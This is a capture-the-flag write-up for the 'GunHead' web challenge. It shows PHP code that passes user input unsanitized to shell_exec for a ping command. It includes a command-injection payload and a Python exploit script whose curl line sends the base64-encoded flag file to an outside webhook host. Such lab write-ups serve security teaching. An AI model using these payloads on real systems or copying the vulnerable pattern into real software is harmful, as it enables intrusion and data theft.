# GunHead :: Easy
## Scenario 

```
During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable.
With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently
 needs to take it down.
```

## Solve

![](/images/gunhead-source-tree.png)

Our mission in this challenge is to disable the **Gunhead** combat robot.  

Here is the landing page:  

![](/images/gunhead_index.png)

While exploring the application, I could not help but notice the terminal icon on the sidebar of the **Gunhead** view.  

This icon opens some kind of web based terminal containing certains commands.  
![](/images/gunhead_commands.png)
  
Let's take a look at the source !  

The application is written in PHP, and uses the MVC design pattern.  
This means that we have to go look at the controller to understand which function is bound to which endpoint.  
Following this will lead us to the executed code when we trigger this endpoint.  

`ReconController.php`:
```php
<?php
class ReconController
{
    public function index($router)
    {
        return $router->view('index');
    }

    public function ping($router)
    {
        $jsonBody = json_decode(file_get_contents('php://input'), true);

        if (empty($jsonBody) || !array_key_exists('ip', $jsonBody))
        {
            return $router->jsonify(['message' => 'Insufficient parameters!']);
        }

        $pingResult = new ReconModel($jsonBody['ip']); // WE initiate a ReconModel instance.

        return $router->jsonify(['output' => $pingResult->getOutput()]);
    }
}
```

Let's go look at the source for the `ReconModel` object.  

```php
<?php
#[AllowDynamicProperties]

class ReconModel
{   
    public function __construct($ip)
    {
        $this->ip = $ip;
    }

    public function getOutput()
    {
        # Do I need to sanitize user input before passing it to shell_exec?
        return shell_exec('ping -c 3 '.$this->ip);
    }
}
```

Here we can see that the object execute a raw shell command with the unsanitized user input.  

This means that command injection is possible.  
We can obtain command execution on the server this way.  

Let's craft our exploit:  

![](/images/command_injection.png)

We can inject a command by terminating the ping command using a semicolon.  
We can then add our own command which will be executing, wether the ping command fails or succeeds.  

```bash
;curl https://webhook.site/3578d2dc-d2dd-468b-a8c9-9bda1f8d1281;
```

## Exploit Script

```python
#!/usr/bin/env python3
import requests

TARGET = "http://localhost:1337"
HOOK = "<your-hook>"
PING_ENDPOINT = "/api/ping"
PAYLOAD = {"ip": f";curl {HOOK}/$(cat /flag.txt|base64 -w0);"}


if __name__ == "__main__":
    print("[*] Exploitating command injection in Gunhead ...")
    requests.post(TARGET + PING_ENDPOINT, json=PAYLOAD)
```

